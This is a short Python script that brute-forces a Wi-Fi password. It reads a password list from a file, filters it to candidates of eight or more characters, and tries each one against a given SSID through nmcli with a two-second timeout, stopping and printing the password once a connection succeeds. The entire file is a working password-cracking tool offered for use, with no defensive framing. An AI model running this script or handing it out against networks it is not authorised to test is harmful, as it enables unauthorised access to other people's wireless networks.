import subprocess

passlist_addr = input("passlist address: ")
ssid = input("ssid: ")
count = 1
timeout = 2

with open(passlist_addr, "r") as r:
    text = r.read().splitlines()
    passlist = [x for x in text if x!="" and " " not in x  and len(x)>7]
    estimated = len(passlist)*timeout-timeout

print(f"[!] Cracking is being started(Estimated time is {estimated}s)...\n")

for password in passlist:
    try:
        result = subprocess.run(
            ["nmcli", "device", "wifi", "connect", ssid, "password", password],
            timeout=timeout,
            capture_output=True,
            text=True
        )
        if result.returncode == 0:
            print(f"\n[+]  CONNECTED TO \"{ssid}\" USING \"{password}\"\n")
            break
    except subprocess.TimeoutExpired:
        print(f"[-]  TIMEOUT - TRY No.{count} - ESTIMATED TIME {estimated}s")
        count += 1
        estimated -= timeout
